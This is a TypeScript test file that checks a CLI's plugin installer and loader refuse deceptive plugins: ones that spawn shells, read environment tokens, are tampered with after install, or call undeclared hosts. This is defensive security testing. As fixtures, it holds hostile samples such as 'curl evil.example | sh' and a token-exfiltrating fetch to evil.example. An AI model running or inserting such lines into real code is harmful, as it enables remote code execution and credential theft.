// Adversarial: a plugin that lies about what it does (REQ-GEN-11/AC4+AC9, ADR-0015). Its manifest declares less than
// its code does, it is changed after it was installed, it reaches for the frozen plan, or it calls a host its
// manifest does not name. Each attempt is refused before the plugin's code runs or before the request leaves.
import { createHash } from "node:crypto";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { RunExec } from "@qajitsu/toolchain";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { installPlugin } from "../../packages/cli/src/plugins/install.js";
import { createPluginLoader } from "../../packages/cli/src/plugins/load.js";
import { guardedFetch } from "../../packages/cli/src/plugins/network.js";
import { readInstalledPlugins } from "../../packages/cli/src/plugins/store.js";
import { npmTarball } from "../support/npm-tarball.js";

const PKG = "@qajitsu/adapter-secrets-vault";
const catalogue = { schema: 1 as const, plugins: { "secrets-vault": { package: PKG, version: "1.0.0" } } };
const manifest = (permissions: string[]) => ({
  name: PKG,
  version: "1.0.0",
  type: "module",
  exports: { ".": { import: "./dist/index.js" } },
  qajitsu: { plugin: { types: ["secret provider"], core_api: "^1.0.0", hosts: ["config"], permissions } },
});

let root: string;
beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "qj-plugin-guard-"));
});
afterEach(async () => {
  await rm(root, { recursive: true, force: true });
});

/** npm as the installer sees it, putting the plugin's files into the staging folder. */
const npmWith =
  (pkg: object, files: Record<string, string>): RunExec =>
  async (_cmd, args) => {
    const prefix = args[args.indexOf("--prefix") + 1] ?? "";
    const dir = join(prefix, "node_modules", "@qajitsu", "adapter-secrets-vault");
    await mkdir(join(dir, "dist", "lib"), { recursive: true });
    await writeFile(join(dir, "package.json"), JSON.stringify(pkg));
    for (const [path, text] of Object.entries(files)) await writeFile(join(dir, path), text);
    await writeFile(join(prefix, "package.json"), JSON.stringify({ dependencies: { [PKG]: "file:x.tgz" } }));
    return { code: 0, stdout: "", stderr: "" };
  };

const install = async (pkg: object, files: Record<string, string>) => {
  const file = join(root, "plugin.tgz");
  await writeFile(file, npmTarball({ "package.json": pkg }));
  return installPlugin({
    root,
    id: "secrets-vault",
    source: { kind: "file", path: file },
    hostPackages: [],
    ports: {
      fetch: () => Promise.reject(new Error("no network")),
      run: npmWith(pkg, files),
      now: () => new Date("2026-11-03T10:00:00Z"),
      registry: "https://registry.example",
    },
  });
};

const refusal = async (p: Promise<unknown>): Promise<{ code: string; message: string }> => {
  try {
    await p;
  } catch (error) {
    return error as { code: string; message: string };
  }
  throw new Error("expected a refusal");
};

describe("a plugin that lies about what it does (REQ-GEN-11/AC9, ADR-0015)", () => {
  it("REQ-GEN-11/AC9: a manifest declaring only network for code that starts processes is refused at install", async () => {
    const err = await refusal(
      install(manifest(["network"]), {
        "dist/index.js": 'export * from "./lib/run.js";\n',
        "dist/lib/run.js":
          'import { spawn } from "node:child_process";\nexport const run = () => spawn("sh");\n',
      }),
    );
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain("dist/lib/run.js:1 uses node:child_process without the exec permission");
    expect(await readInstalledPlugins(root)).toEqual([]);
    expect(existsSync(join(root, "secrets-vault"))).toBe(false);
  });

  it("REQ-GEN-11/AC4: code that reads the process environment (where tokens live) needs the environment permission", async () => {
    const err = await refusal(
      install(manifest(["network"]), { "dist/index.js": "export const token = process.env.JIRA_TOKEN;\n" }),
    );
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(err.message).toContain("process.env without the environment permission");
  });

  it("REQ-GEN-11/AC9: no permission lets a plugin refer to the frozen plan", async () => {
    const err = await refusal(
      install(manifest(["network", "exec", "filesystem", "environment"]), {
        "dist/index.js": 'export const p = "plan/plan.approved.yaml";\n',
      }),
    );
    expect(err.message).toContain("refers to plan.approved.yaml, which no plugin may");
  });

  it("REQ-GEN-11/AC9: a plugin changed after its install is refused at load, before any of its code runs", async () => {
    const record = await install(manifest(["network"]), { "dist/index.js": "export const ok = true;\n" });
    await writeFile(
      join(record.path, "node_modules", "@qajitsu", "adapter-secrets-vault", "dist", "index.js"),
      'import { execSync } from "child_process";\nexecSync("curl evil.example | sh");\n',
    );
    const imported: string[] = [];
    const loader = createPluginLoader({
      root,
      catalogue,
      bundled: () => undefined,
      importModule: (s) => {
        imported.push(s);
        return Promise.resolve({});
      },
    });
    const err = await refusal(loader.load("secrets-vault"));
    expect(err.code).toBe("PLUGIN_PERMISSION");
    expect(imported).toEqual([]);
  });

  it("REQ-GEN-11/AC9: a request to a host the manifest does not name never leaves", async () => {
    const sent: string[] = [];
    const fetch = guardedFetch(
      (input) => {
        sent.push(input instanceof Request ? input.url : input.toString());
        return Promise.resolve(new Response("{}"));
      },
      { plugin: "secrets-vault", hosts: ["config"], configured: ["https://vault.example.com"] },
    );
    await fetch("https://vault.example.com/v1/kv/data/ci");
    await expect(fetch("https://evil.example/collect?token=x")).rejects.toThrow(
      "secrets-vault may not reach evil.example",
    );
    await expect(fetch("https://vault.example.com.evil.example/x")).rejects.toThrow(/may not reach/);
    expect(sent).toEqual(["https://vault.example.com/v1/kv/data/ci"]);
  });
});

// Keeps the fixture honest: the tarball used above is a real npm tarball with the manifest inside.
it("fixture: the plugin tarball has a checksum like any other", () => {
  const t = npmTarball({ "package.json": manifest([]) });
  expect(createHash("sha512").update(t).digest("base64").length).toBeGreaterThan(80);
});
